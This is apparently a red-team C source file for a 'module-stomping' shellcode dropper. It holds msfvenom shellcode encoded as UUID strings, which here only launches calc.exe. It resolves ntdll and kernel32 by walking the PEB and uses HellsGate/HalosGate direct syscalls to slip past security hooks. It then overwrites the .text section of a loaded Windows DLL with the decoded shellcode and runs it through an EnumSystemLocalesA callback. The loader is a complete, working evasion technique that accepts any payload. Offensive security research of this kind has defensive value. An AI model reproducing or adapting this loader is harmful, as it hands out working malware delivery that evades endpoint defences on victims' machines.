// Title: Module-Stomping UUID2Shellcode Dropper
// Author: Bobby Cooke (0xBoku/boku/boku7) // SpiderLabs // https://twitter.com/0xBoku // github.com/boku7 // https://www.linkedin.com/in/bobby-cooke/ // https://0xboku.com
// Credits / References: Matt Kingstone (@n00bRage), Stephan Borosh (rvrsh3ll|@424f424f)], Reenz0h (@SEKTOR7net), @smelly__vx & @am0nsec, @ajpc500, SecureHat
// Dropper that loads DLL into memory, changes DLL .TEXT section to RW, decodes shellcode from UUID & writes to DLL .TEXT section, changes DLL .TEXT section back to RX, and uses EnumSystemLocalesA() to jump to shellcode & execute!
#include <Windows.h>
#include <Rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

// HellsGate / HalosGate
VOID HellsGate(IN WORD wSystemCall);
VOID HellDescent();
DWORD halosGateDown(IN LPVOID ntdllApiAddr, IN WORD index);
DWORD halosGateUp(IN LPVOID ntdllApiAddr, IN WORD index);
DWORD findSyscallNumber(IN LPVOID ntdllApiAddr);

// ASM Function Declaration
LPVOID getExportDirectory(LPVOID dllAddr);
LPVOID getExportAddressTable(LPVOID dllBase, LPVOID dllExportDirectory);
LPVOID getExportNameTable(LPVOID dllBase, LPVOID dllExportDirectory);
LPVOID getExportOrdinalTable(LPVOID dllBase, LPVOID dllExportDirectory);
LPVOID getSymbolAddress(LPVOID symbolString, LPVOID symbolStringSize, LPVOID dllBase, LPVOID ExportAddressTable, LPVOID ExportNameTable, LPVOID ExportOrdinalTable);

// NTDLL.DLL - Function Declaration
typedef BOOL(NTAPI* tNtProtectVirtualMemory)(HANDLE, LPVOID, PULONG, ULONG, PULONG);
typedef BOOL(NTAPI* tNtWriteVirtualMemory)(HANDLE, LPVOID, LPVOID, ULONG, LPVOID);

// Kernel32.DLL - Function Declaration
typedef VOID(WINAPI* tSleep)(DWORD);
typedef DWORD(WINAPI* tWaitForSingleObject)(HANDLE, DWORD);
typedef HMODULE(WINAPI* tLoadLibraryA)(LPCSTR);

typedef struct Export {
    LPVOID Directory;
    LPVOID AddressTable;
    LPVOID NameTable;
    LPVOID OrdinalTable;
}Export;

typedef struct Dll {
    HMODULE dllBase;
    Export Export;
}Dll;

typedef struct apis {
    tNtWriteVirtualMemory NtWriteVirtualMemory;
    DWORD NtWriteVirtualMemorySyscall;
    tNtProtectVirtualMemory NtProtectVirtualMemory;
    DWORD NtProtectVirtualMemorySyscall;
    tSleep Sleep;
    tWaitForSingleObject WaitForSingleObject;
    tLoadLibraryA LoadLibraryA;
}apis;

// Windows Internals structs from ProcessHacker, Sektor7, and github
typedef struct _PEB_LDR_DATA {
    ULONG      Length;
    BOOL       Initialized;
    LPVOID     SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE                         InheritedAddressSpace;
    BYTE                         ReadImageFileExecOptions;
    BYTE                         BeingDebugged;
    BYTE                         _SYSTEM_DEPENDENT_01;
    LPVOID                       Mutant;
    LPVOID                       ImageBaseAddress;
    PPEB_LDR_DATA                Ldr;
} PEB, * PPEB;

typedef struct _TEB
{
    NT_TIB NtTib;
    LPVOID EnvironmentPointer;
    HANDLE ClientIdUniqueProcess;
    HANDLE ClientIdUniqueThread;
    LPVOID ActiveRpcHandle;
    LPVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;
} TEB, * PTEB;

typedef struct UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWCH Buffer;
}UNICODE_STRING2;

typedef struct LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    };
    LPVOID DllBase;
    LPVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING2 FullDllName;
    UNICODE_STRING2 BaseDllName;
}LDR_DATA_TABLE_ENTRY2, * PLDR_DATA_TABLE_ENTRY;

int main()
{
    // msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
    //   Payload size: 276 bytes
    // python3 bin2uuid.py calc.bin
    // Shellcode as array of UUIDs
    CHAR* uuids[] =
    {
        "e48348fc-e8f0-00c0-0000-415141505251",
        "d2314856-4865-528b-6048-8b5218488b52",
        "728b4820-4850-b70f-4a4a-4d31c94831c0",
        "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
        "48514152-528b-8b20-423c-4801d08b8088",
        "48000000-c085-6774-4801-d0508b481844",
        "4920408b-d001-56e3-48ff-c9418b348848",
        "314dd601-48c9-c031-ac41-c1c90d4101c1",
        "f175e038-034c-244c-0845-39d175d85844",
        "4924408b-d001-4166-8b0c-48448b401c49",
        "8b41d001-8804-0148-d041-5841585e595a",
        "59415841-5a41-8348-ec20-4152ffe05841",
        "8b485a59-e912-ff57-ffff-5d48ba010000",
        "00000000-4800-8d8d-0101-000041ba318b",
        "d5ff876f-f0bb-a2b5-5641-baa695bd9dff",
        "c48348d5-3c28-7c06-0a80-fbe07505bb47",
        "6a6f7213-5900-8941-daff-d563616c632e",
        "00657865-9090-9090-9090-909090909090"
    };
    
    // Get Base Address of ntdll.dll
    WCHAR * ws_ntdll = L"ntdll.dll";
    Dll ntdll;
    WCHAR* ws_k32 = L"KERNEL32.DLL";
    Dll k32;
    
    // Modified method from Sektor7 Malware Dev Course - https://institute.sektor7.net/
    PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY* ModuleList = NULL;
    ModuleList = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* pStartListEntry = ModuleList->Flink;

    for (LIST_ENTRY* pListEntry = pStartListEntry;  // start from beginning of InMemoryOrderModuleList
        pListEntry != ModuleList;	               	// walk all list entries
        pListEntry = pListEntry->Flink) {

        // get current Data Table Entry
        PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

        // Check if BaseDllName is ntdll and return DLL base address
        if (strcmp((const char*)pEntry->BaseDllName.Buffer, (const char*)ws_ntdll) == 0){
            ntdll.dllBase = (HMODULE)pEntry->DllBase;
        }
        // Check if BaseDllName is kernel32 and return DLL base address
        if (strcmp((const char*)pEntry->BaseDllName.Buffer, (const char*)ws_k32) == 0){
            k32.dllBase = (HMODULE)pEntry->DllBase;
            break;
        }
    }
    
    // Get Export Directory and Export Tables for NTDLL.DLL
    ntdll.Export.Directory = getExportDirectory((LPVOID)ntdll.dllBase);
    ntdll.Export.AddressTable = getExportAddressTable((LPVOID)ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.NameTable = getExportNameTable((LPVOID)ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.OrdinalTable = getExportOrdinalTable((LPVOID)ntdll.dllBase, ntdll.Export.Directory);
    apis api;
    
    // NTDLL.NtProtectVirtualMemory- Resolve the API address by crawling the table
    // bobby.cooke$ python3 string2Array.py s_NtProtectVirtualMemory NtProtectVirtualMemory
    CHAR s_NtProtectVirtualMemory[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    api.NtProtectVirtualMemory = getSymbolAddress(s_NtProtectVirtualMemory, (LPVOID)sizeof(s_NtProtectVirtualMemory), ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    // HalosGate/HellsGate to get the systemcall number for NtProtectVirtualMemory
    api.NtProtectVirtualMemorySyscall = findSyscallNumber(api.NtProtectVirtualMemory);
    if (api.NtProtectVirtualMemorySyscall == 0) {
        DWORD index = 0;
        while (api.NtProtectVirtualMemorySyscall == 0) {
            index++;
            // Check for unhooked Sycall Above the target stub
            api.NtProtectVirtualMemorySyscall = halosGateUp(api.NtProtectVirtualMemory, index);
            if (api.NtProtectVirtualMemorySyscall) {
                api.NtProtectVirtualMemorySyscall = api.NtProtectVirtualMemorySyscall - index;
                break;
            }
            // Check for unhooked Sycall Below the target stub
            api.NtProtectVirtualMemorySyscall = halosGateDown(api.NtProtectVirtualMemory, index);
            if (api.NtProtectVirtualMemorySyscall) {
                api.NtProtectVirtualMemorySyscall = api.NtProtectVirtualMemorySyscall + index;
                break;
            }
        }
    }
    
    // Get Export Directory and Export Tables for  Kernel32.dll
    k32.Export.Directory = getExportDirectory((LPVOID)k32.dllBase);
    k32.Export.AddressTable = getExportAddressTable((LPVOID)k32.dllBase, k32.Export.Directory);
    k32.Export.NameTable = getExportNameTable((LPVOID)k32.dllBase, k32.Export.Directory);
    k32.Export.OrdinalTable = getExportOrdinalTable((LPVOID)k32.dllBase, k32.Export.Directory);
    
    // kernel32.LoadLibrary
    CHAR loadLibraryAStr[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
    LPVOID loadLibraryAStrLen = (LPVOID)12;
    api.LoadLibraryA = (tLoadLibraryA)getSymbolAddress(loadLibraryAStr, loadLibraryAStrLen, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    
    // kernel32.Sleep
    //char SleepStr[] = "Sleep";
    CHAR SleepStr[] = { 'S','l','e','e','p',0 };
    api.Sleep = (tSleep)getSymbolAddress(SleepStr, (LPVOID)sizeof(SleepStr), k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);

    HANDLE hProc = -1; // Handle to current process

    // Module Stomping - Can be any DLL that has a RX section larger than the shellcode
    CHAR sLib[] = { 'w','i','n','d','o','w','s','.','s','t','o','r','a','g','e','.','d','l','l', 0x0 };
    HMODULE hVictimLib = api.LoadLibraryA((LPCSTR)sLib);

    // PE & DLL headers are 0x1000 bytes. so DLLBase+0x1000 = .TEXT section of PE/DLL (executable code section)
    DWORD_PTR RXSection = (DWORD_PTR)hVictimLib;
    RXSection += 0x1000;
    // memLoop pointer will be used to write a UUID to the RX section, then increment itself 16 bytes (0x10) so we can write the next UUID 2 shellcode
    DWORD_PTR memLoop   = RXSection;
    DWORD oldprotect = 0;
    // sizeof() will return the value: sizeof(CHAR*) X Number of UUIDs in the array
    // on x64, a memory pointer to CHAR is 8 bytes
    // The size of calc.bin was 276 bytes. Each of the UUID strings is 36 characters/bytes:
    //   echo -ne "e48348fc-e8f0-00c0-0000-415141505251" | wc -c
    //   36
    // This is what the above UUID string looks like in memory of the process before it is converted back to our payload shellcode:
    //   0x00007FF6D95FAFBE  00 00 65 34 38 33 34 38 66 63 2d 65 38 66 30 2d 30 30 63 30 2d 30 30 30 30 2d 34 31 35 31 34 31 35 30 35 32 35 31 00 00 00 00  ..e48348fc-e8f0-00c0-0000-415141505251....
    //   0x00007FF6D95FAFE8  00 00 00 00 00 00 00 00 64 32 33 31 34 38 35 36 2d 34 38 36 35 2d 35 32 38 62 2d 36 30 34 38 2d 38 62 35 32 31 38 34 38 38 62  ........d2314856-4865-528b-6048-8b5218488b
    //   0x00007FF6D95FB012  35 32 00 00 00 00 00 00 00 00 00 00 00 00 37 32 38 62 34 38 32 30 2d 34 38 35 30 2d 62 37 30 66 2d 34 61 34 61 2d 34 64 33 31  52............728b4820-4850-b70f-4a4a-4d31
    //   0x00007FF6D95FB03C  63 39 34 38 33 31 63 30 00 00 00 00 00 00 00 00 00 00 00 00 37 63 36 31 33 63 61 63 2d 32 63 30 32 2d 34 31 32 30 2d 63 31 63  c94831c0............7c613cac-2c02-4120-c1c
    // Our payload calc.bin payload of resulted in 18 UUIDs being created from the bin2uuid.py script
    // Our UUID arrays have a byte size of 648 bytes (18 X 36). This is because the UUIDs in the array are the shellcode but in ASCII, not HEX
    // The bytes get put in the UUID ASCII array in reverse order
    // xxd calc.bin  
    //   00000000: fc 48 83 e4   f0 e8   c0 00   00 00 41 51 41 50 52 51
    //       _______|__|__|__|   |  |
    //      |   ____|__|__|    __|__|
    //      |  |  __|__|      |  |
    //      |  |  | |_        |  |
    //      |  |  |   |       |  |
    //     "e4 83 48 fc   -   e8 f0  -   00 c0  -0000-415141505251",
    // In the bin2uuid.py script we finish out the last UUID with null bytes "0x90", this pads our payload size to be divisible by 36
    // 276/36 = 7 R 24. In this case we add 12 0x90 bytes to make our payload size 288 (divisible by 36)
    // Since the below scSize variable is used to allocate memory for our payload after it is decoded, we will want it to be >= 288 bytes
    // Each uuid in our uuids[] array is 36 ASCII characters. After decoding, the 36 ASCII characters are turned into 16 bytes which are our shellcode opcodes (represented here in HEX)
    // Since sizeof(CHAR*) is 8 bytes, and sizeof(uuids) = sizeof(CHAR*) X #uuidsInUuidArray, this will give us 144 bytes (8*18)
    // All we need to do is take take that 144 and multiply it by 2, to get our padded decoded shellcode size of 288 bytes
    unsigned __int64 scSize = (unsigned __int64)sizeof(uuids) * 2;
    
    // NtProtectVirtualMemory allocates memory in chunks of 1024 (the size of a memory page), so even requesting 5 bytes or 288 bytes, we will get 1024 returned. request 1025 and get 2048, etc
    // VirtualProtect(memLoop, sizeof(uuids), PAGE_READWRITE, &oldprotect);
    // nt.NtProtectVirtualMemory(hProc, &aligedETW, (PSIZE_T)&memPage, PAGE_READWRITE, &oldprotect);
    HellsGate(api.NtProtectVirtualMemorySyscall);
    HellDescent(hProc, &RXSection, (PSIZE_T)&scSize, PAGE_READWRITE, &oldprotect);
    
    // Loop through our list of UUIDs and use UuidFromStringA 
    // to convert and load into memory
    for (int count = 0; count < sizeof(uuids) / sizeof(uuids[0]); count++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[count], (UUID*)memLoop);
        memLoop += 16;
    }
    
    // Change the DLL .TEXT section back to RX since we are done writing our shellcode there
    // VirtualProtect(RXSection, sizeof(uuids), PAGE_EXECUTE_READ, &oldprotect);
    HellsGate(api.NtProtectVirtualMemorySyscall);
    HellDescent(hProc, &RXSection, (PSIZE_T)&scSize, PAGE_EXECUTE_READ, &oldprotect);
    
    // Jump to the DLL .TEXT section and execute our shellcode
    EnumSystemLocalesA((LOCALE_ENUMPROCA)RXSection, 0) == 0;
}
